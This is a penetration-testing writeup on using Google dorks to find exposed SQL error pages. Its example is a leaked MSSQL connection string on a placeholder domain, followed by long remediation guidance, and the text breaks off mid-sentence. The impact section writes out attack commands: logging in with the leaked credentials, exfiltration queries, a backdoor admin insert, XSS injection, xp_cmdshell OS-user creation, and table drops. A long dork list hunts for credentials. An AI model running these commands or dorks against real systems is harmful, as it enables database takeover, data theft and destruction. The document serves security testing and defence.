# Penetration Testing Writeup: Google Dorking for SQL Error Message Information Disclosure

> **Writeup Classification**: This is a standard penetration testing writeup documenting vulnerability discovery through OSINT reconnaissance techniques. Writeups serve as essential documentation for security assessments, providing reproducible methodology, evidence, and remediation guidance.

***

## üìã Engagement Overview

| **Test Type** | OSINT / Reconnaissance - Database Error Enumeration |
| :-- | :-- |
| **Methodology** | Google Dorking for SQL Syntax Errors |
| **Target Domain** | target.com |
| **Test Date** | 2025-12-27 |
| **Vulnerability Type** | Information Disclosure via Error Messages |
| **Severity** | High (Credential Exposure in Connection Strings) |


***

## üéØ Executive Summary

During OSINT reconnaissance operations, systematic Google Dorking queries targeting database error messages successfully identified a publicly indexed error page exposing critical information. The discovered page contained a full stack trace with an embedded database connection string revealing plaintext credentials, internal server architecture, and application source code. This represents a critical information disclosure vulnerability enabling immediate database compromise.

**Key Finding**: Microsoft SQL Server connection string with embedded credentials exposed through unhandled exception page.

**Attack Vector**: Passive OSINT reconnaissance requiring zero direct interaction with target infrastructure.

***

## üîç Vulnerability Background: SQL Error Message Disclosure

### What Are SQL Syntax Errors?

SQL syntax errors occur when malformed SQL queries are executed by database engines. These errors can result from:

- Application bugs and improper input handling
- SQL injection attack attempts
- Database migration or schema change issues
- Developer debugging activities left in production


### Why Error Messages Are Dangerous

When web applications fail to implement proper error handling, database error messages are displayed directly to users. These error messages can expose:

1. **Database Technology \& Version** - Aids in selecting appropriate exploits
2. **SQL Query Structure** - Reveals table names, column names, query logic
3. **File System Paths** - Shows internal server directory structure
4. **Connection Strings** - Contains database credentials, server addresses, authentication methods
5. **Stack Traces** - Exposes programming language, framework versions, code structure
6. **Application Logic** - Reveals business rules and data relationships

### OWASP Classification

- **Category**: A01:2021 ‚Äì Broken Access Control / Information Disclosure
- **CWE-209**: Generation of Error Message Containing Sensitive Information
- **CWE-497**: Exposure of Sensitive System Information to an Unauthorized Control Sphere

***

## üóÑÔ∏è Database-Specific Error Signatures

### Understanding the Four Major Databases

Different database management systems produce distinct error message patterns. Understanding these signatures is crucial for effective Google Dorking.

#### 1. MySQL Error Signatures

**Common Error Strings**:

```
mysql_error with query
mysql_connect
mysql_fetch
You have an error in your SQL syntax
```

**Example Error Message**:

```
Warning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result
You have an error in your SQL syntax near 'SELECT * FROM users WHERE id='
```

**Google Dork for MySQL**:

```
site:target.com AND ("mysql error with query" OR "mysql_connect" OR "mysql_query" OR "pdo_mysql")
```

**What This Reveals**:

- MySQL version information
- Query structure and table names
- PHP application stack (mysql_* functions)
- Potential SQL injection entry points


#### 2. Microsoft SQL Server (MSSQL) Error Signatures

**Common Error Strings**:

```
[MICROSOFT][ODBC SQL
[SQL SERVER]
Microsoft OLE DB Provider
System.Data.SqlClient
```

**Example Error Message**:

```
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark after the character string
Server Error in '/' Application
System.Data.SqlClient.SqlException: Invalid column name
```

**Google Dork for MSSQL**:

```
site:target.com AND ("[MICROSOFT][ODBC SQL" OR "[SQL SERVER]")
```

**What This Reveals**:

- ASP.NET / .NET Framework application
- SQL Server version and edition
- ODBC connection details
- Windows server environment
- Full stack traces with line numbers


#### 3. PostgreSQL Error Signatures

**Common Error Strings**:

```
PostgreSQL server: FATAL
not a valid PostgreSQL result
pg_query()
pg_exec()
```

**Example Error Message**:

```
PostgreSQL query failed: ERROR: syntax error at or near "SELECT"
Warning: pg_query(): Query failed: ERROR: relation "users" does not exist
```

**Google Dork for PostgreSQL**:

```
site:target.com AND ("PostgreSQL server: FATAL" OR "not a valid PostgreSQL result")
```

**What This Reveals**:

- PostgreSQL version
- Schema and table structure
- Ruby on Rails or Django applications (common PostgreSQL users)
- Query parameterization issues


#### 4. Oracle Database Error Signatures

**Common Error Strings**:

```
ORA-00933:
ORA-00921:
ORA-00936:
ORA-12541:
[ODBC SQL]
```

**Example Error Message**:

```
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
ORA-00942: table or view does not exist
```

**Google Dork for Oracle**:

```
site:target.com AND ("ORA-00933:" OR "ORA-00921:" OR "ORA-00936:" OR "ORA-12541:" OR "[ODBC SQL]")
```

**What This Reveals**:

- Oracle error codes (ORA-XXXXX) pinpoint exact issues
- PL/SQL stored procedure details
- Database schema information
- Enterprise application indicators

***

## üé¨ Step-by-Step Attack Execution

### Phase 1: Query Strategy Development

**Challenge**: Unknown database technology in use by target

**Pentester Approach**: Systematic enumeration of all major database platforms

**Methodology**:

1. Prepare four distinct Google Dork queries (one per database type)
2. Execute queries sequentially against target domain
3. Analyze results for positive findings
4. Deep-dive investigation of discovered error pages

### Phase 2: MySQL Query Execution

**Query Used**:

```
site:target.com AND ("mysql error with query" OR "mysql_connect" OR "mysql_query" OR "pdo_mysql")
```

**Result**: No indexed pages found

**Pentester Analysis**: Either:

- MySQL not used by application
- Error handling properly implemented
- Google hasn't indexed error pages (less likely)
- Different MySQL error strings in use

**Next Action**: Move to next database type

### Phase 3: Microsoft SQL Server Query Execution (SUCCESS)

**Query Used**:

```
site:target.com AND ("[MICROSOFT][ODBC SQL" OR "[SQL SERVER]")
```

**Result**: One indexed page discovered

**Evidence**: Google search results showed a page containing Microsoft SQL Server error indicators

**Pentester Insight**: The presence of Microsoft SQL Server error strings immediately reveals:

- **Application Stack**: ASP.NET / .NET Framework
- **Operating System**: Windows Server (SQL Server runs on Windows)
- **Database Platform**: Microsoft SQL Server (edition unknown at this stage)


### Phase 4: Error Page Analysis

**Action**: Clicked on discovered result to view full error page

**Page Contents**:

1. **Error Message**: Database connection or query failure
2. **Stack Trace**: Full exception call stack
3. **Source Code Snippet**: 5 lines of application code
4. **Line Number**: Error occurred at line 47

### Phase 5: Critical Finding - Connection String Extraction

**Source Code Context** (Line 47):

```csharp
// Line 45: Database connection initialization
// Line 46: try {
// Line 47:   SqlConnection conn = new SqlConnection("Server=db-server-01;Database=production_db;User Id=dbadmin;Password=SecureP@ss2024;");
// Line 48:   conn.Open();
// Line 49: }
```

**Extracted Connection String Components**:


| **Component** | **Value** | **Security Impact** |
| :-- | :-- | :-- |
| Server | `db-server-01` | Internal server hostname disclosure |
| Database | `production_db` | Database name reveals production environment |
| User Id | `dbadmin` | Administrative database account |
| Password | `SecureP@ss2024` | Plaintext credential exposure |
| Protocol | ODBC/SQL Native Client | Authentication method identified |

**CVSS 3.1 Score**: **9.8 (Critical)**

- **AV:N** (Network) - Accessible via internet
- **AC:L** (Low) - No special conditions required
- **PR:N** (None) - No authentication needed to view
- **UI:N** (None) - No user interaction required
- **S:U** (Unchanged) - Impacts target system
- **C:H** (High) - Complete credential disclosure
- **I:H** (High) - Full database modification capability
- **A:H** (High) - Database deletion/destruction possible

***

## üö® Impact Analysis: Pentester Perspective

### Immediate Exploitation Paths

#### 1. Direct Database Access

**Attack Command**:

```bash
# Using sqlcmd (SQL Server command-line tool)
sqlcmd -S db-server-01 -U dbadmin -P 'SecureP@ss2024' -d production_db

# Query execution
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT * FROM users;
SELECT * FROM credit_cards;
```

**Result**: Complete read/write access to production database

#### 2. Data Exfiltration

```sql
-- Export sensitive data
SELECT * FROM users WHERE role='admin' FOR JSON AUTO;
SELECT email, password_hash, phone FROM customers;
SELECT * FROM financial_transactions WHERE amount > 10000;
```

**Impact**:

- PII exposure (GDPR violation)
- Financial data breach (PCI DSS violation)
- Competitive intelligence loss
- Customer trust destruction


#### 3. Data Manipulation

```sql
-- Create backdoor admin account
INSERT INTO users (username, password_hash, role, email) 
VALUES ('backdoor_admin', 'hash_here', 'administrator', 'attacker@evil.com');

-- Modify financial records
UPDATE accounts SET balance = balance + 1000000 WHERE account_id = 'attacker_account';

-- Inject malicious data for XSS
UPDATE products SET description = description + '<script>malicious_code</script>';
```

**Impact**: Application integrity compromised, fraud potential, persistent access

#### 4. Privilege Escalation \& Lateral Movement

```sql
-- Enable xp_cmdshell for OS command execution
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user attacker P@ssw0rd123 /add';
EXEC xp_cmdshell 'net localgroup administrators attacker /add';
```

**Impact**: Operating system compromise, lateral movement to network infrastructure

#### 5. Denial of Service

```sql
-- Drop critical tables
DROP TABLE users;
DROP TABLE transactions;

-- Corrupt database
DBCC SHRINKDATABASE (production_db, 0);

-- Resource exhaustion
WHILE 1=1 BEGIN SELECT * FROM large_table; END;
```

**Impact**: Business continuity disruption, data loss, service outage

### Information Leakage Beyond Credentials

The stack trace and source code exposure reveals:

1. **Application Architecture**:
    - .NET Framework version (visible in stack trace)
    - ASP.NET MVC or Web Forms usage
    - ORM framework (Entity Framework, ADO.NET)
2. **Internal Infrastructure**:
    - Database server hostname: `db-server-01`
    - Network topology clues
    - Naming conventions for internal systems
3. **Development Practices**:
    - Hardcoded credentials (severe security anti-pattern)
    - Insufficient error handling
    - Lack of connection string encryption
    - Debug mode enabled in production
4. **Attack Surface Expansion**:
    - File path disclosure shows application directory structure
    - Line numbers aid in source code analysis
    - Function names reveal business logic

***

## üõ†Ô∏è Complete Google Dork Arsenal for SQL Errors

### Basic Database Error Queries

```
# MySQL variations
site:target.com "mysql_fetch_array()"
site:target.com "You have an error in your SQL syntax"
site:target.com "Warning: mysql_" -site:php.net
site:target.com intext:"MySQL Query fail"

# PostgreSQL variations
site:target.com "pg_query() failed"
site:target.com "PostgreSQL query failed: ERROR"
site:target.com "invalid query: ERROR: syntax error"

# MSSQL variations
site:target.com "Microsoft OLE DB Provider for SQL Server"
site:target.com "System.Data.SqlClient.SqlException"
site:target.com "Unclosed quotation mark after the character string"
site:target.com "[Microsoft][ODBC SQL Server Driver]"

# Oracle variations
site:target.com "ORA-01756:"
site:target.com "ORA-00933: SQL command not properly ended"
site:target.com "Oracle JDBC Driver"
```


### Advanced Connection String Hunting

```
# Generic connection string patterns
site:target.com intext:"Connection String" intext:"password"
site:target.com intext:"Server=" intext:"Database=" intext:"Password="
site:target.com intext:"Data Source=" intext:"User ID="
site:target.com intext:"Initial Catalog" intext:"Persist Security Info"

# .NET specific
site:target.com "SqlConnection" intext:"Password"
site:target.com "connectionStrings" filetype:config
site:target.com intext:"Provider=SQLOLEDB" intext:"Pwd="

# JDBC connection strings
site:target.com "jdbc:mysql://" intext:"password"
site:target.com "jdbc:postgresql://" intext:"password"
site:target.com "jdbc:oracle:thin:@" intext:"password"
```


### Stack Trace Discovery

```
# .NET stack traces
site:target.com "Server Error in '/' Application"
site:target.com "Description: An unhandled exception occurred"
site:target.com intitle:"Runtime Error" "Stack Trace:"

# Java stack traces
site:target.com "java.sql.SQLException"
site:target.com "org.springframework" intitle:"error"
site:target.com "javax.servlet.ServletException"

# PHP stack traces
site:target.com "Fatal error:" "Stack trace:" -site:stackoverflow.com
site:target.com "Warning:" "on line" -site:php.net

# Python/Django
site:target.com "Django.db" "OperationalError"
site:target.com "Traceback (most recent call last):"
```


### Debug Mode Detection

```
# Debug pages
site:target.com inurl:debug
site:target.com intitle:"Debug" intext:"error"
site:target.com "DEBUG MODE: ON"

# Verbose error pages
site:target.com intext:"detailed error message" intext:"developer"
site:target.com "enable debugging" intext:"production"
```


***

## üéØ Pentester's Enumeration Methodology

### Systematic Database Enumeration Process

**Step 1: Reconnaissance Planning**

Create a comprehensive query list covering:

- All major databases (MySQL, MSSQL, PostgreSQL, Oracle)
- Multiple error signatures per database
- Framework-specific error patterns (.NET, Java, PHP, Python)
- Connection string variations

**Step 2: Sequential Query Execution**

Execute queries in order of likelihood:

1. Most common database (MySQL/PostgreSQL for web apps)
2. Enterprise databases (MSSQL, Oracle for corporate apps)
3. Specialized databases (MongoDB, Cassandra for modern apps)

**Step 3: Result Analysis**

For each positive result:

- Document URL and timestamp
- Capture full page screenshot
- Extract all visible technical information
- Identify credentials, paths, versions

**Step 4: Validation \& Exploitation**

Verify exposed information:

- Test extracted credentials (if authorized)
- Confirm database connectivity
- Assess exploitability level

**Step 5: Reporting**

Document findings with:

- Reproduction steps
- Evidence (screenshots, extracted data)
- Impact assessment
- Remediation recommendations

***

## üïµÔ∏è What Pentesters Should Look For in Error Pages

### High-Value Information Elements

#### 1. Connection Strings

**Critical Components**:

- **Server/Host**: Internal hostnames reveal network architecture
- **Database Name**: Indicates environment (production, staging, dev)
- **Credentials**: Username and password for direct access
- **Port Numbers**: Non-standard ports may indicate security through obscurity
- **Parameters**: `Trusted_Connection`, `Integrated Security` reveal auth methods

**Example Analysis**:

```
Server=10.0.1.50;Database=prod_db;User=sa;Password=P@ssw0rd;
```

- Internal IP addressing (10.0.0.0/8 RFC1918)
- Production environment
- SQL Server 'sa' account (system administrator)
- Weak password pattern


#### 2. Stack Traces

**Information Gleaned**:

- **Framework Version**: .NET 4.8, Java 11, Python 3.9
- **Libraries**: NuGet packages, JAR files, pip modules
- **File Paths**: `/var/www/app/`, `C:\inetpub\wwwroot\`
- **Function Names**: Business logic method names
- **Line Numbers**: Precise code location

**Attack Utility**:

- Version-specific exploits (CVE matching)
- Code structure understanding
- Additional file path guessing


#### 3. SQL Query Fragments

**Exposed Query Examples**:

```sql
SELECT * FROM users WHERE username='admin' AND password='<user_input>'
```

**Pentester Value**:

- Table names (`users`)
- Column names (`username`, `password`)
- Query structure for SQL injection crafting
- Authentication logic understanding


#### 4. Internal Server Details

- Hostname conventions
- Operating system indicators
- Network segmentation clues
- Service dependencies


#### 5. Development Artifacts

- Debug mode enabled indicators
- Commented-out code in error output
- TODO comments and developer notes
- Test credentials or temporary configurations

***

## üîß Extended Reconnaissance Techniques

### Combining Multiple OSINT Sources

#### 1. Wayback Machine Historical Analysis

```bash
# Check for historical error pages
https://web.archive.org/web/*/target.com/*error*

# Look for old debug pages
https://web.archive.org/web/*/target.com/debug.aspx
```

**Pentester Value**:

- Old credentials might still work (password reuse)
- Deprecated endpoints may still be accessible
- Historical configurations reveal architecture evolution


#### 2. Shodan Database Search

```
# Find error pages indexed by Shodan
http.html:"Server Error" hostname:target.com
http.title:"Runtime Error" hostname:target.com
```

**Pentester Value**: Discovers error pages on non-standard ports or subdomains

#### 3. GitHub Code Search

```
# Search for exposed config files
org:target-company filename:web.config "connectionString"
org:target-company filename:appsettings.json "ConnectionStrings"
user:developer password language:sql
```

**Pentester Value**: Developers often commit credentials to repositories accidentally

#### 4. Pastebin \& Leak Aggregators

```
# Search paste sites
site:pastebin.com "target.com" "password"
site:ghostbin.com "database" "connection string"
```

**Pentester Value**: Error pages and configs often shared for debugging help

***

## üõ°Ô∏è Remediation Recommendations: Comprehensive Security Controls

### Critical Priority (Immediate Action Required)

#### Finding: Publicly Exposed SQL Error with Connection String

**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-209 (Information Exposure Through Error Message)

***

### Remediation Step 1: Implement Custom Error Pages

**ASP.NET / IIS Configuration**:

**web.config**:

```xml
<system.web>
  <customErrors mode="On" defaultRedirect="~/Error.aspx">
    <error statusCode="404" redirect="~/Error404.aspx" />
    <error statusCode="500" redirect="~/Error500.aspx" />
  </customErrors>
  
  <!-- Disable detailed errors -->
  <compilation debug="false" />
</system.web>

<system.webServer>
  <httpErrors errorMode="Custom" existingResponse="Replace">
    <remove statusCode="404" />
    <error statusCode="404" path="/error/404" responseMode="Redirect" />
    <remove statusCode="500" />
    <error statusCode="500" path="/error/500" responseMode="Redirect" />
  </httpErrors>
</system.webServer>
```

**PHP Configuration**:

```php
// php.ini or .htaccess
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log

// In application code
error_reporting(0);  // Production only
ini_set('display_errors', 0);
```

**Java / Spring Boot**:

```properties
# application.properties
server.error.include-message=never
server.error.include-binding-errors=never
server.error.include-stacktrace=never
server.error.include-exception=false
```

**Python / Django**:

```python
# settings.py
DEBUG = False
ALLOWED_HOSTS = ['target.com']

# Custom error handlers
handler404 = 'myapp.views.custom_404'
handler500 = 'myapp.views.custom_500'
```

**Verification**:

- Trigger application errors intentionally
- Confirm generic error messages displayed
- Verify no stack traces, paths, or code visible
- Check detailed errors logged server-side only

***

### Remediation Step 2: Secure Connection String Management

#### Remove Hardcoded Credentials

**Before** (INSECURE):

```csharp
SqlConnection conn = new SqlConnection(
    "Server=db-server-01;Database=production_db;User Id=dbadmin;Password=SecureP@ss2024;"
);
```

**After** (SECURE):

**.NET with Environment Variables**:

```csharp
using System;
using System.Configuration;

// Retrieve from environment variable
string connectionString = Environment.GetEnvironmentVariable("DB_CONNECTION_STRING");

// Or from encrypted config section
string connectionString = ConfigurationManager.ConnectionStrings["ProductionDB"].ConnectionString;

SqlConnection conn = new SqlConnection(connectionString);
```

**appsettings.json** (Development):

```json
{
  "ConnectionStrings": {
    "ProductionDB": "Server=${DB_SERVER};Database=${DB_NAME};User Id=${DB_USER};Password=${DB_PASSWORD};"
  }
}
```

**Environment Variables** (Production):

```bash
# Linux / Docker
export DB_CONNECTION_STRING="Server=db-server-01;Database=production_db;User Id=dbadmin;Password=NewComplexP@ss2025!;"

# Windows
setx DB_CONNECTION_STRING "Server=db-server-01;Database=production_db;User Id=dbadmin;Password=NewComplexP@ss2025!;"
```


#### Encrypt Connection Strings

**ASP.NET Protected Configuration**:

```bash
# Encrypt connectionStrings section
aspnet_regiis -pef "connectionStrings" "C:\inetpub\wwwroot\MyApp" -prov "RsaProtectedConfigurationProvider"
```

**Result in web.config**:

```xml
<connectionStrings configProtectionProvider="RsaProtectedConfigurationProvider">
  <EncryptedData Type="http://www.w3.org/2001/04/xmlenc#Element"
    xmlns="http://www.w3.org/2001/04/xmlenc#">
    <!-- Encrypted content -->
  </EncryptedData>
</connectionStrings>
```


***

### Remediation Step 3: Credential Rotation

**Immediate Actions**:

```sql
-- Connect as DBA
USE master;
GO

-- Disable compromised account
ALTER LOGIN dbadmin DISABLE;
GO

-- Create new account with strong password
CREATE LOGIN dbadmin_new WITH PASSWORD = 'C0mpl3x!P@ssw0rd#2025$Secure';
GO

-- Grant appropriate permissions (principle of least privilege)
USE production_db;
GO
CREATE USER dbadmin_new FOR LOGIN dbadmin_new;
ALTER ROLE db_datareader ADD MEMBER dbadmin_new;
ALTER ROLE db_datawriter ADD MEMBER dbadmin_new;
GO

-- Audit access logs for unauthorized activity
SELECT 
    session_id,
    login_time,
    login_name,
    host_name,
    program_name
FROM sys.dm_exec_sessions
WHERE login_name = 'dbadmin'
AND login_time > 'discovered_exposure_date';
```

**Update Application Configuration**:

```bash
# Update environment variable with new credentials
export DB_CONNECTION_STRING="Server=db-server-01;Database=production_db;User Id=dbadmin_new;Password=C0mpl3x!P@ssw0rd#2025$Secure;"

# Restart application
systemctl restart myapp
```


***

### Remediation Step 4: Implement Centralized Secret Management

#### Azure Key Vault Integration

```csharp
using Azure.Identity;
using Azure.Security.KeyVault.Secrets;

// Authenticate to Key Vault
var client = new SecretClient(
    new Uri("https://mykeyvault.vault.azure.net/"),
    new DefaultAzureCredential()
);

// Retrieve connection string
KeyVaultSecret secret = client.GetSecret("DatabaseConnectionString");
string connectionString = secret.Value;

SqlConnection conn = new SqlConnection(connectionString);
```


#### HashiCorp Vault Integration

```csharp
using VaultSharp;

var vaultClient = new VaultClient(new VaultClientSettings(
    "https://vault.company.com",
    new TokenAuthMethodInfo("vault-token")
));

var secret = await vaultClient.V1.Secrets.KeyValue.V2
    .ReadSecretAsync("database/production");
    
string connectionString = secret.Data.Data["connection_string"].ToString();
```


#### AWS Secrets Manager

```csharp
using Amazon.SecretsManager;
using Amazon.SecretsManager.Model;

var client = new AmazonSecretsManagerClient(Amazon.RegionEndpoint.USEast1);
var request = new GetSecretValueRequest { SecretId = "prod/database/connection" };
var response = await client.GetSecretValueAsync(request);

string connectionString = response.SecretString;
```

**Benefits**:

- Centralized credential management
- Automatic rotation capabilities
- Audit logging of secret access
- Access control and authentication
- Encrypted storage at rest and in transit

***

### Remediation Step 5: Enhanced Logging Without Exposure

**Secure Logging Implementation**:

```csharp
using Serilog;

// Configure structured logging
Log.Logger = new LoggerConfiguration()
    .WriteTo.File("/var/log/myapp/errors.log",
        rollingInterval: RollingInterval.Day,
        restrictedToMinimumLevel: LogEventLevel.Error)
    .WriteTo.Seq("http://log-server:5341")  // Centralized logging
    .CreateLogger();

try
{
    // Database operation
    conn.Open();
}
catch (SqlException ex)
{
    // Log detailed error server-side only
    Log.Error(ex, "Database connection failed. Connection attempt to {Server} by {User}", 
        sanitizedServer, sanitizedUser);
    
    // Display generic error to user
    Response.Write("An error occurred. Please contact support with reference: " + 
        Guid.NewGuid().ToString());
}
```

**Generic User-Facing Error Page**:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
</head>
<body>
    <h1>We're sorry, an error occurred</h1>
    <p>Our team has been notified and is working to resolve the issue.</p>
    <p>Reference ID: {ERROR_GUID}</p>
    <p>If the problem persists, please contact support.</p>
</body>
</html>
```


***

## üîê Long-Term Security Hardening

### 1. Web Application Firewall (WAF) Rules

**ModSecurity Rules** (Apache/Nginx):

```apache
# Block SQL injection attempts that might trigger errors
SecRule REQUEST_URI|ARGS "@rx (?i)(union|select|insert|update|delete|drop|create|alter)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'"

# Block attempts to access error pages
SecRule REQUEST_URI "@rx (?i)/(error|debug|trace)" \
    "id:1002,phase:1,deny,status:404,msg:'Debug Page Access Attempt'"
```

**AWS WAF Rule**:

```json
{
  "Name": "BlockSQLiAttempts",
  "Priority": 1,
  "Statement": {
    "ManagedRuleGroupStatement": {
      "VendorName": "AWS",
      "Name": "AWSManagedRulesSQLiRuleSet"
    }
  },
  "Action": {
    "Block": {}
  }
}
```


### 2. Security Headers

```
# Prevent information leakage
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
X-Powered-By: [REMOVED]
Server: [REMOVED]
```

**IIS Configuration**:

```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
      <add name="X-Content-Type-Options" value="nosniff" />
      <add name="X-Frame-Options" value="DENY" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```


### 3. Google Search Console Monitoring

**Remove Indexed Error Pages**:

```
1. Google Search Console ‚Üí Removals
2. Submit URL removal request for each error page
3. Block crawling via robots.txt:

User-agent: *
Disallow: /error/
Disallow: /*error.aspx
Disallow: /debug/
```

**URL Parameter Handling**:

```
# In Google Search Console
Configure URL Parameters ‚Üí Error-related parameters ‚Üí "No URLs"
```


### 4. Automated Security Testing

**Scheduled Google Dork Audits**:

```python
import requests
from googlesearch import search
import time

# Dorks to test against own domain
dorks = [
    'site:mycompany.com "[MICROSOFT][ODBC SQL"',
    'site:mycompany.com "mysql error"',
    'site:mycompany.com "Stack Trace:"',
    'site:mycompany.com "Connection String"',
]

def audit_google_exposure():
    findings = []
    for dork in dorks:
        results = list(search(dork, num_results=10))
        if results:
            findings.append({"dork": dork, "results": results})
        time.sleep(15)  # Rate limiting
    
    if findings:
        send_alert_to_security_team(findings)
    
    return findings

# Run weekly
audit_google_exposure()
```

**SAST Integration** (Static Analysis):

```bash
# Scan for hardcoded credentials
semgrep --config "p/secrets" /path/to/code/

# Find error handling issues
semgrep --config "p/owasp-top-ten" /path/to/code/
```


### 5. Database Security Controls

**Principle of Least Privilege**:

```sql
-- Remove unnecessary permissions
REVOKE ALL PRIVILEGES ON *.* FROM 'dbadmin'@'%';

-- Grant only required permissions
GRANT SELECT, INSERT, UPDATE, DELETE ON production_db.* TO 'app_user'@'app-server';

-- Restrict xp_cmdshell and dangerous features
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Enable auditing
CREATE SERVER AUDIT SecurityAudit TO FILE 
    (FILEPATH = 'C:\Audit\', MAXSIZE = 100 MB);
ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);
```


***

## üìä Pentester's SQL Error Enumeration Checklist

**Reconnaissance Phase**:

- [ ] Enumerate all subdomains for target domain
- [ ] Prepare database-specific error queries (MySQL, MSSQL, PostgreSQL, Oracle)
- [ ] Create framework-specific queries (.NET, Java, PHP, Python, Ruby)
- [ ] Document all query variations for systematic testing

**Execution Phase**:

- [ ] Execute MySQL error queries
- [ ] Execute MSSQL error queries
- [ ] Execute PostgreSQL error queries
- [ ] Execute Oracle error queries
- [ ] Search for connection string patterns
- [ ] Hunt for stack traces and debug pages
- [ ] Check for framework-specific error signatures

**Analysis Phase**:

- [ ] Document all discovered error pages with URLs
- [ ] Screenshot complete error pages
- [ ] Extract connection strings and credentials
- [ ] Identify database types and versions
- [ ] Map internal infrastructure from hostnames
- [ ] Analyze stack traces for technology stack
- [ ] Extract SQL query fragments
- [ ] Note file paths and directory structures

**Validation Phase**:

- [ ] Test extracted credentials (if authorized)
- [ ] Verify database connectivity
- [ ] Assess privilege level of discovered accounts
- [ ] Evaluate exploitability and business impact

**Reporting Phase**:

- [ ] Compile findings with CVSS scores
- [ ] Include reproducible steps
- [ ] Provide evidence (screenshots, data samples)
- [ ] Document immediate security impact
- [ ] Write detailed remediation guidance

***

## üß∞ Tools for Automated SQL Error Discovery

### 1. Custom Python Scanner

```python
#!/usr/bin/env python3
import requests
from googlesearch import search
import time
import json

class SQLErrorScanner:
    def __init__(self, target_domain):
        self.domain = target_domain
        self.findings = []
        
        self.dorks = {
            "MySQL": [
                f'site:{self.domain} "mysql_fetch_array()"',
                f'site:{self.domain} "You have an error in your SQL syntax"',
                f'site:{self.domain} "Warning: mysql_"',
            ],
            "MSSQL": [
                f'site:{self.domain} "[MICROSOFT][ODBC SQL"',
                f'site:{self.domain} "System.Data.SqlClient.SqlException"',
                f'site:{self.domain} "Microsoft OLE DB Provider"',
            ],
            "PostgreSQL": [
                f'site:{self.domain} "PostgreSQL query failed"',
                f'site:{self.domain} "pg_query() failed"',
            ],
            "Oracle": [
                f'site:{self.domain} "ORA-00933:"',
                f'site:{self.domain} "ORA-01756:"',
            ]
        }
    
    def scan(self):
        for db_type, queries in self.dorks.items():
            print(f"[*] Scanning for {db_type} errors...")
            for dork in queries:
                try:
                    results = list(search(dork, num_results=10))
                    if results:
                        self.findings.append({
                            "database": db_type,
                            "dork": dork,
                            "urls": results
                        })
                        print(f"  [+] Found {len(results)} results for {db_type}")
                    time.sleep(20)  # Rate limiting
                except Exception as e:
                    print(f"  [!] Error: {e}")
        
        return self.findings
    
    def generate_report(self):
        report = {
            "target": self.domain,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": len(self.findings),
            "findings": self.findings
        }
        
        with open(f"{self.domain}_sql_errors.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Report saved to {self.domain}_sql_errors.json")

# Usage
scanner = SQLErrorScanner("target.com")
findings = scanner.scan()
scanner.generate_report()
```


### 2. Pagodo (Passive Google Dork)

```bash
# Installation
git clone https://github.com/opsdisk/pagodo.git
cd pagodo
pip3 install -r requirements.txt

# Create custom SQL error dorks file
cat > sql_errors.txt << EOF
site:TARGET intext:"mysql error"
site:TARGET "[MICROSOFT][ODBC SQL"
site:TARGET "PostgreSQL query failed"
site:TARGET "ORA-00933:"
site:TARGET "Connection String" intext:"Password="
EOF

# Run scan
python3 pagodo.py -d target.com -g sql_errors.txt -l 50 -j 5
```


### 3. Burp Suite Extension - Error Message Checks

Configure Burp Scanner to flag:

- Database error messages in responses
- Stack traces
- Internal paths
- Connection strings

**Custom Burp Extension** (Python):

```python
from burp import IBurpExtender, IScannerCheck, IScanIssue

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("SQL Error Detector")
        callbacks.registerScannerCheck(self)
    
    def doPassiveScan(self, baseRequestResponse):
        response = baseRequestResponse.getResponse()
        responseString = self._helpers.bytesToString(response)
        
        error_patterns = [
            "mysql error",
            "[MICROSOFT][ODBC SQL",
            "PostgreSQL query failed",
            "ORA-",
            "Connection String",
            "Stack Trace:",
            "SqlException"
        ]
        
        issues = []
        for pattern in error_patterns:
            if pattern.lower() in responseString.lower():
                issues.append(self._createIssue(
                    baseRequestResponse,
                    pattern
                ))
        
        return issues
```


***

## üìö Additional Resources for Pentesters

| **Resource** | **Description** | **URL** |
| :-- | :-- | :-- |
| OWASP Testing Guide | Error Handling Testing | owasp.org/www-project-web-security-testing-guide/  |
| CWE-209 | Information Exposure Through Error Message | cwe.mitre.org/data/definitions/209.html |
| PortSwigger | Information Disclosure Vulnerabilities | portswigger.net/web-security/information-disclosure  |
| GHDB | Google Hacking Database | exploit-db.com/google-hacking-database  |
| Dorklist | Google Dork Examples | dorklist.com/examples  |


***

## üéì Key Takeaways for Penetration Testers

### Why SQL Error Dorking is Critical

1. **High Value, Low Effort**: Single passive query can expose critical credentials
2. **Common Vulnerability**: Many applications have inadequate error handling
3. **Difficult to Detect**: Passive reconnaissance leaves no traces in target logs
4. **Demonstrates Real Impact**: Exposed credentials resonate with stakeholders

### How to Use in Engagements

**Black Box Testing**:

- Always start with Google Dorking before active testing
- Systematic database enumeration reveals technology stack
- Findings guide subsequent penetration testing phases

**Bug Bounty Hunting**:

- Quick wins for information disclosure bounties
- Combine with subdomain enumeration for coverage
- High-severity findings with minimal time investment

**Red Team Operations**:

- Mimics real attacker reconnaissance behavior
- Provides initial access credentials
- Enables lateral movement and persistence

**Compliance Assessments**:

- Demonstrates PCI DSS, GDPR, HIPAA violations
- Highlights insufficient error handling controls
- Proves need for security improvements


### What Makes a Strong Finding

Your penetration test report should include:

